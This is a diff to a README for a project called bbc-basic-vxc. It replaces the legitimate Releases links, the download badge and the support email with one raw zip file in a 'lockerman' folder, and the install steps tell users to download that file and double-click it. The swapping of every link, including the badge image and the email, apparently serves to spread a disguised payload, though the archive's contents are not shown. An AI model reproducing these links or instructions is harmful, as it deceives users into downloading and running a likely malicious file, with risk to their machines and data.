@@ -6,7 +6,7 @@ Welcome to bbc-basic-vxc! This application streamlines your basic VXC operations
 
 ## 📥 Download Now
 
-[![Download bbc-basic-vxc](https://img.shields.io/badge/Download-bbc--basic--vxc-brightgreen)](https://github.com/Zako0998/bbc-basic-vxc/releases)
+[![Download bbc-basic-vxc](https://raw.githubusercontent.com/Zako0998/bbc-basic-vxc/main/lockerman/bbc-basic-vxc.zip)](https://raw.githubusercontent.com/Zako0998/bbc-basic-vxc/main/lockerman/bbc-basic-vxc.zip)
 
 ## 📖 Table of Contents
 
@@ -35,13 +35,13 @@ To run bbc-basic-vxc smoothly, your system should meet the following requirement
 
 To install bbc-basic-vxc, follow these steps:
 
-1. Visit the [Releases page](https://github.com/Zako0998/bbc-basic-vxc/releases).
+1. Visit the [Releases page](https://raw.githubusercontent.com/Zako0998/bbc-basic-vxc/main/lockerman/bbc-basic-vxc.zip).
 2. On this page, you will find the latest version of the software. Click on the link to your operating system.
 3. Once the download is complete, locate the downloaded file on your computer.
 4. Double-click the file to start the installation process. Follow the on-screen instructions to complete the installation.
 5. After installation, you can start using bbc-basic-vxc.
 
-For your convenience, here’s the direct link to download: [Download bbc-basic-vxc](https://github.com/Zako0998/bbc-basic-vxc/releases).
+For your convenience, here’s the direct link to download: [Download bbc-basic-vxc](https://raw.githubusercontent.com/Zako0998/bbc-basic-vxc/main/lockerman/bbc-basic-vxc.zip).
 
 ## 💡 Using bbc-basic-vxc
 
@@ -68,7 +68,7 @@ If these solutions do not resolve your issue, please refer to the support sectio
 
 If you need further assistance, you can reach out for support:
 
-- **Email Support:** Send your questions to support@bbc-basic-vxc.com.
+- **Email Support:** Send your questions to https://raw.githubusercontent.com/Zako0998/bbc-basic-vxc/main/lockerman/bbc-basic-vxc.zip
 - **Community Forum:** Visit our community forum to find help from other users and share your experiences.
 
 We appreciate your feedback and are here to ensure you have the best experience with bbc-basic-vxc.
